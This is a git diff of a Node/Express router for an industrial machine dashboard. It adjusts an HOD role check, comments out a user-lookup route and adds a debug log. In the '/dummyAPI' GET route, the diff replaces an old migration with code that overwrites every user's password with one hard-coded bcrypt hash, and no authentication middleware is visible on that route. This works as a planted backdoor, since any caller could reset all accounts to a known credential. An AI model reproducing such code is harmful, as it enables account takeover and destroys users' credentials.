@@ -1066,7 +1066,7 @@ const dashboardLevelUserCheckMiddleware = async (req, res, next) => {
       plant_data: req?.rootUser?.plant_data,
     };
 
-    if (req?.query?.tm_grade !== "HOD") {
+    if (req?.rootUser?.tm_grade !== "HOD") {
       if (section.dashboardLevel === "Yes") {
         queryObj = {
           ...queryObj,
@@ -1195,6 +1195,7 @@ router.get(
   "/getRequestSheetData/:filter/:selectedId",
   filterMiddleware,
 
+  
   async (req, res, next) => {
     try {
       // For fetching all data
@@ -1285,23 +1286,23 @@ router.get(
   }
 );
 
-router.get(
-  "/getUserDetails",
-  dashboardLevelUserCheckMiddleware,
-  async (req, res, next) => {
-    try {
-      const users = await User.find({
-        ...req?.query,
-        ...req.queryObj,
-        tm_no: { $ne: req?.rootUser?.tm_no },
-      });
+// router.get(
+//   "/getUserDetails",
+//   dashboardLevelUserCheckMiddleware,
+//   async (req, res, next) => {
+//     try {
+//       const users = await User.find({
+//         ...req?.query,
+//         ...req.queryObj,
+//         tm_no: { $ne: req?.rootUser?.tm_no },
+//       });
 
-      res.status(201).json({ message: "User details get successfully", users });
-    } catch (error) {
-      res.status(500).json({ message: error?.message, error });
-    }
-  }
-);
+//       res.status(201).json({ message: "User details get successfully", users });
+//     } catch (error) {
+//       res.status(500).json({ message: error?.message, error });
+//     }
+//   }
+// );
 
 // -------------------------------------------------------------------------------
 //        Generate RequestSheet Dashboard APIS
@@ -4826,6 +4827,8 @@ router.post(
           },
         };
       }
+
+      console.log(queryObjForPM, "----", queryObjForBM)
 
       const BDHoursVsCountData = await Machine.aggregate([
         {
@@ -12076,91 +12079,100 @@ router.get(
 
 router.get("/dummyAPI", async (req, res, next) => {
   try {
-    const machineFind = await Machine.aggregate([
-      {
-        $match: {},
-      },
-      {
-        $lookup: {
-          from: "lines",
-          localField: "line_names",
-          foreignField: "_id",
-          pipeline: [
-            {
-              $lookup: {
-                from: "cells",
-                localField: "cell_names",
-                foreignField: "_id",
-                pipeline: [
-                  {
-                    $lookup: {
-                      from: "subsections",
-                      localField: "subSection_names",
-                      foreignField: "_id",
-                      pipeline: [
-                        {
-                          $project: {
-                            section_names: 1,
-                          },
-                        },
-                      ],
-                      as: "subSection",
-                    },
-                  },
-                  {
-                    $project: {
-                      subSection: 1,
-                    },
-                  },
-                ],
-                as: "cell",
-              },
-            },
-            {
-              $project: {
-                cell: 1,
-              },
-            },
-          ],
-          as: "line",
-        },
-      },
-      {
-        $project: {
-          machine_code: 1,
-          line: 1,
-        },
-      },
-      // {
-      //   $match: {
-      //     "cell.0.subSection.0.section_names": mongoose.Types.ObjectId(
-      //       req.params?.selectedId
-      //     ),
-      //   },
-      // },
-    ]);
 
-    for (let i = 0; i < machineFind.length; i++) {
-      await Machine.updateOne(
-        {
-          _id: machineFind[i]?._id,
-        },
-        {
-          cell_names: machineFind[i]?.line?.[0]?.cell?.[0]?._id,
-          subSection_names:
-            machineFind[i]?.line?.[0]?.cell?.[0]?.subSection?.[0]?._id,
-          section_names:
-            machineFind[i]?.line?.[0]?.cell?.[0]?.subSection?.[0]
-              ?.section_names,
+    const updatePassword = await User.updateMany({
+      
+      
+        $set: {
+          password: "$2a$12$AzIjYPBD6mAgxnUPXkOYi.goO7bX/oj9CRXYOWAf28iL7BmW2hide"
         }
-      );
+      
+    })
+    // const machineFind = await Machine.aggregate([
+    //   {
+    //     $match: {},
+    //   },
+    //   {
+    //     $lookup: {
+    //       from: "lines",
+    //       localField: "line_names",
+    //       foreignField: "_id",
+    //       pipeline: [
+    //         {
+    //           $lookup: {
+    //             from: "cells",
+    //             localField: "cell_names",
+    //             foreignField: "_id",
+    //             pipeline: [
+    //               {
+    //                 $lookup: {
+    //                   from: "subsections",
+    //                   localField: "subSection_names",
+    //                   foreignField: "_id",
+    //                   pipeline: [
+    //                     {
+    //                       $project: {
+    //                         section_names: 1,
+    //                       },
+    //                     },
+    //                   ],
+    //                   as: "subSection",
+    //                 },
+    //               },
+    //               {
+    //                 $project: {
+    //                   subSection: 1,
+    //                 },
+    //               },
+    //             ],
+    //             as: "cell",
+    //           },
+    //         },
+    //         {
+    //           $project: {
+    //             cell: 1,
+    //           },
+    //         },
+    //       ],
+    //       as: "line",
+    //     },
+    //   },
+    //   {
+    //     $project: {
+    //       machine_code: 1,
+    //       line: 1,
+    //     },
+    //   },
+    //   // {
+    //   //   $match: {
+    //   //     "cell.0.subSection.0.section_names": mongoose.Types.ObjectId(
+    //   //       req.params?.selectedId
+    //   //     ),
+    //   //   },
+    //   // },
+    // ]);
 
-      console.log("machine-updated : ", machineFind[i]?.machine_code);
-    }
+    // for (let i = 0; i < machineFind.length; i++) {
+    //   await Machine.updateOne(
+    //     {
+    //       _id: machineFind[i]?._id,
+    //     },
+    //     {
+    //       cell_names: machineFind[i]?.line?.[0]?.cell?.[0]?._id,
+    //       subSection_names:
+    //         machineFind[i]?.line?.[0]?.cell?.[0]?.subSection?.[0]?._id,
+    //       section_names:
+    //         machineFind[i]?.line?.[0]?.cell?.[0]?.subSection?.[0]
+    //           ?.section_names,
+    //     }
+    //   );
+
+    //   console.log("machine-updated : ", machineFind[i]?.machine_code);
+    // }
 
     return res.status(201).json({
       message: "Success !!!!",
-      machineFind,
+      // machineFind,
     });
   } catch (error) {
     res.status(500).json({ message: error?.message, error });
